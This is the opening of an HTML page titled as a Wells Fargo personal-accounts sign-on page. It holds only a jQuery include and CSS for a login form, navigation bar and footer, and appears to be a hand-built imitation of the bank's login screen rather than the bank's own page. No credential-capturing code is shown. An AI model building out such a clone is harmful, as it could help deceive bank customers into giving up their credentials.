<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <style>
      body{
    margin: 0;
    padding: 0;
}

 .span1{
    position: fixed;
    right: 1rem;
    display: none;
    color: white;
}

.sidenav {
    height: 100%;
    width: 0;
    position: fixed;
    z-index: 10;
    top: 3.4rem;
    color: gray;
    right: 0;
    background-color: white;
    overflow-x: hidden;
    transition: 0.5s;
}
.searchEnroll{
    display: flex;
    justify-content: space-between;
}
.searchEnroll div{
    display: flex;
    align-items: center;
    gap:0.3rem;
}
.sidenav>div{
    border: 1px solid darkgray;
    padding: 1rem;
}

.sidenav .closebtn {
  position: absolute;
  top: 0;
  z-index: 10;
  right: 25px;
  font-size: 36px;
  z-index: 10;
  margin-left: 50px;
}
nav{
    background-color: #d71e28;
    position: sticky;
    top: 0;
    z-index: 1024;
    padding: 0.8rem 7rem;
    align-items: center;
    display: flex;
    justify-content: space-between;
    border-bottom: 0.28rem solid #fcc60a;
    font-family: sans-serif;
}
.logo svg{
    width: 13em;
}
nav ul{
    display: flex;
    margin: 0;
    align-items: center;
    color: white;
    gap: 1em;
    font-size: 0.9em;
    

}
nav ul li{
    list-style: none;
}
.search{
    position: relative;
}
.search input{
    padding: 0.6rem 0.8rem;
    width: 4.7em;
    border-radius: 0.5em;
    border: none;
}
.search svg{
    position: absolute;
    right: 0.7em;
    top: 0.5em;
}
.enroll{
    display: flex;
    align-items: center;
    gap: 0.5em;
    fill: white;
}
.enroll svg{
    margin-bottom: 0.2em;
}
#main{
    display: block;
    padding-top: 3rem;
    padding-bottom: 10rem;
    height: 90vh;
    width: 100%;
    background:  url('data:image/jpeg;base64,') center center;
    background-size: cover;
}
footer{
    display: flex;
    margin-top: 5rem;
    flex-direction: column;
    gap: 1.8rem;
    font-family: sans-serif;
    padding: 3rem;
    background-color: white;
    font-size: 0.9em;
}
.about{
    display: flex;
    flex-direction: column;
    gap: 1.8rem;
    padding-left: 2rem;
  
}
.about div:first-child{
    display: flex;
    gap: 0.8rem;
}
.copyright{
    padding-left: 2rem;
}
.container{
    background: white;
    width: 65%;
    margin: auto;
    display: flex;
    border-radius: 0.8rem;
    flex-direction: column;
    align-items: center;

}
form{
    border: 1px solid transparent;
    width: 60%;
    display: flex;
    flex-direction: column;
    gap: 2.5rem;
}

form input{
    width: 90%;
    padding-left: 1rem;
    font-size: 1.3em;
    border: none;
    border-bottom: 1px solid;
    padding: 0.8rem;
    outline: none;
}
form button{
    padding: 0.6rem 4.2rem;
    border-radius: 3rem;
    font-size: 1.2rem;
    color: #b5adad;
    cursor: pointer;
    background: #e2dede;
    border: none;
    margin-bottom: 2.5rem;
}
input[type="checkbox"]{
    width: 1.5rem;
    height: 1.5rem;
    margin: 0;
    cursor: pointer;
}
.check{
    display: flex;
    gap: 1rem;
    font-family: sans-serif;
    align-items: flex-end;
}
.button {
    display: flex;
    justify-content: center;
}
.forgot{
    background: #f4f0ed;
    width: 100%;
    text-align: center;
    text-decoration: underline;
    cursor: pointer;
    font-family: sans-serif;
    padding: 1.3rem 0rem;
    border-radius: inherit;
}
.container h3{
    font-size: 1.8rem;
    margin: 0;
    font-weight: 500;
    font-family: system-ui;
    margin-top: 2rem;
}
.container h3+p{
 margin-bottom: 1rem;
 font-family:"Wells Fargo Sans", Verdana, Arial, Helvetica, sans-serif;
  font-weight: 400;
}
.password,.cross{
    position:relative;
}
.password span,.cross span{
    font-size: 1.8rem;
    right: 2rem;
    top: 0.5rem;
    position: absolute;
    color: gray;
    cursor: pointer;
}
.cross span{
    font-size: 1.6rem;

}
.about2{
    display: none;
}
@media only screen and (max-width: 600px) {
    #main{
        background: white;
    }
  }
@media only screen and (max-width: 800px) {
    nav{
        justify-content: center;
    }
    nav ul {
      display:none;
    }
    #main{
        display: block;
        padding-top: 0;
        padding-bottom: 0;
        height: 90vh;
     
    }
    .container{
         width: 100%;
               border-radius: 0;
}
    form{
         width: 95%;
         margin: auto;
    }
    form input{
        width: 90%;
        padding-left: 1rem;
        font-size: 1.1em;
        padding: 0.7rem;
    }
    .forgot{
        padding: 0;
        background:white;
        border-radius: 0;
        padding-bottom: 2rem;
    }
    .cross span{
        display:none;
    }
    form button{
        margin-bottom: 0;
        padding: 0.6rem 4rem;
    }
    .container h3{
        font-size: 1.7rem;
        margin-top: 0;
    }
    .about{
        display:none;
    }
    .copyright{
        font-size: 0.7rem;
        width: 93%;
        padding-left: 0.1rem;
        margin: auto;
        border-top: 1px solid;
        padding-top: 0.4rem;
    }
    footer{
    gap: 1.5rem;
    margin-top:0;
    padding:0;
    padding-top: 1rem;
    background:  #f4f0ed;
}
.about2{
    display: flex;
    border: 1px solid transparent;
    width: 91%;
    margin: auto;
    gap: 3rem;
    justify-content: flex-start;
    font-size: 0.8rem;
}
.about2 div{
    display: flex;
    flex-direction: column;
    gap:1.5rem;
}
.span1{
    display: block;
}

  }
    </style>
